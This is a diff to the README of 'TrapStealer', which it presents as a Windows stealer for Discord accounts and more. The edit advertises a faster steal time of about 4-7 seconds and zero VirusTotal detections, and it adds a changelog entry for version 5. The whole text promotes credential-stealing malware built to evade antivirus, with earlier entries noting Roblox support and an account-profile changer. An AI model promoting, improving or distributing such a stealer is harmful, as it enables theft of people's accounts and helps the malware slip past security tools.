@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  TrapStealer is a Windows stealer for Discord and much more. Steal Time: ~6-10 seconds. 0 Detection on VirusTotal (Injection too)
+  TrapStealer is a Windows stealer for Discord and much more. Steal Time: ~4-7 seconds. 0 Detection on VirusTotal (Injection too)
 </p>
 
 <p align="center">
@@ -74,6 +74,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V.5 Make it 2x faster, and removed requests module
 - V4.4.5 Account about me changer added
 - V4.4.1 Make it faster
 - V4.4 Roblox Support ! (more coming)
